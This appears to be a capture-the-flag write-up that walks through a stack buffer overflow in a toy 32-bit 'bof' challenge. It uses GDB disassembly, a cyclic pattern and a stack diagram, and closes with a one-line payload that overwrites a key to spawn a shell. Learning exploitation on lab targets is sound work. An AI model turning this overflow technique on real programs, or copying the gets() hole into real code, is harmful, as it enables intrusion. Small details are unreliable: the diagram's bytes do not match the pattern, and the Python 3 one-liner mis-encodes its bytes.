---
custom_edit_url: null
sidebar_position: 3
---

> Nana told me that buffer overflow is one of the most common software vulnerability.\c
> Is that true?


Let's check the file's properties.

```
bof@ubuntu:~$ file ./bof
./bof: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1cabd158f67491e9edb3df0219ac3a4ef165dc76, for GNU/Linux 3.2.0, not stripped
```

We can see that it is a little-endian 32-bit ELF executable.

```c title="bof.c"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);	// smash me!
    if(key == 0xcafebabe){
        setregid(getegid(), getegid());
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

So the challenge uses `gets()` to read user input into the `overflowme` buffer, which is 32 bytes long.

If the `key` is equal to `0xcafebabe`, we gat a shell. However the `key` is set to `0xdeadbeef` while calling the `func()` function.

Basically we have to overflow the `overflowme` buffer and overwrite the `key` variable.

### Disassembly

Let's disassemble the `main()` function within GDB.

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000129d <+0>:	  lea    ecx,[esp+0x4]
   0x000012a1 <+4>:	  and    esp,0xfffffff0
   0x000012a4 <+7>:	  push   DWORD PTR [ecx-0x4]
   0x000012a7 <+10>:	push   ebp
   0x000012a8 <+11>:	mov    ebp,esp
   0x000012aa <+13>:	push   ecx
   0x000012ab <+14>:	sub    esp,0x4
   0x000012ae <+17>:	call   0x12d5 <__x86.get_pc_thunk.ax>
   0x000012b3 <+22>:	add    eax,0x2d4d
   0x000012b8 <+27>:	sub    esp,0xc
   0x000012bb <+30>:	push   0xdeadbeef
   0x000012c0 <+35>:	call   0x11fd <func>
   0x000012c5 <+40>:	add    esp,0x10
   0x000012c8 <+43>:	mov    eax,0x0
   0x000012cd <+48>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x000012d0 <+51>:	leave
   0x000012d1 <+52>:	lea    esp,[ecx-0x4]
   0x000012d4 <+55>:	ret
End of assembler dump.
```

We can see that the instruction at `main+35` calls `func()`. Let's disassemble that as well.

```
pwndbg> disassemble func
Dump of assembler code for function func:

# --- snip ---
   
   0x00001230 <+51>:	lea    eax,[ebp-0x2c]
   0x00001233 <+54>:	push   eax
   0x00001234 <+55>:	call   0x1060 <gets@plt>

# --- snip ---

End of assembler dump.
```

We can see that the location of the `overflowme` buffer is stored onto the stack, and is passed as an argument to `gets()`.
This location is at `$ebp-0x2c`.

This tells us that the base pointer `$ebp` is at a distance of `0x2c` or 44 bytes from the buffer.

We can even verify this using a cyclic pattern.

```
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Let's provide this as input.

```
pwndbg> run
Starting program: /home/bof/bof
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
overflow me : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Nah..
*** stack smashing detected ***: terminated

Program received signal SIGABRT, Aborted.
0xf7fc4549 in __kernel_vsyscall ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
 EAX  0
 EBX  0xeb8d9
 ECX  0xeb8d9
 EDX  6
 EDI  0xf7fbf500 ◂— 0xf7fbf500
 ESI  0xeb8d9
 EBP  0xffffd458 —▸ 0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 ESP  0xffffd160 —▸ 0xffffd458 —▸ 0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0xf7fc4549 (__kernel_vsyscall+9) ◂— pop ebp
────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate off ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0xf7fc4549 <__kernel_vsyscall+9>     pop    ebp            EBP => 0xffffd458
   0xf7fc454a <__kernel_vsyscall+10>    pop    edx
   0xf7fc454b <__kernel_vsyscall+11>    pop    ecx
   0xf7fc454c <__kernel_vsyscall+12>    ret

   0xf7fc454d <__kernel_vsyscall+13>    int3
   0xf7fc454e                           nop
   0xf7fc454f                           nop
   0xf7fc4550                           nop
   0xf7fc4551                           lea    esi, [esi]
   0xf7fc4558                           lea    esi, [esi]
   0xf7fc455f                           nop
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd160 —▸ 0xffffd458 —▸ 0xffffd4e8 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│-2f4 0xffffd164 ◂— 6
02:0008│-2f0 0xffffd168 ◂— 0xeb8d9
03:000c│-2ec 0xffffd16c —▸ 0xf7e05aa7 (__pthread_kill_implementation+295) ◂— mov ebp, eax
04:0010│-2e8 0xffffd170 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
05:0014│-2e4 0xffffd174 ◂— 0
06:0018│-2e0 0xffffd178 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
07:001c│-2dc 0xffffd17c ◂— 6
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0xf7fc4549 __kernel_vsyscall+9
   1 0xf7e05aa7 __pthread_kill_implementation+295
   2 0xf7e05b2f pthread_kill+31
   3 0xf7db4685 raise+37
   4 0xf7d9d3ac abort+238
   5 0xf7df83fc __libc_message+588
   6 0xf7eb0a3c __fortify_fail+44
   7 0xf7eb0a0f None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Let's calculate the offset of `laaa`.

```
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

### Stack

```
<==: Value is stored at that location
<--: Points to the address

+---------------+ 
|  61 61 61 61  | <== buffer (32 bytes) <-- esp
|	 62 61 61 61  | 
|  63 61 61 61  |
|  64 61 61 61  |
|  65 61 61 61  |
|  66 61 61 61  |
|  67 61 61 61  |
|  68 61 61 61  |
+---------------+
|  69 61 61 61  | <== stored ebp <-- ebp
+---------------+
|  70 61 61 61  | <== return address
+---------------+
```

```
python3 -c 'print("A"*52 + "\xbe\xba\xfe\xca")' | ./bof
```
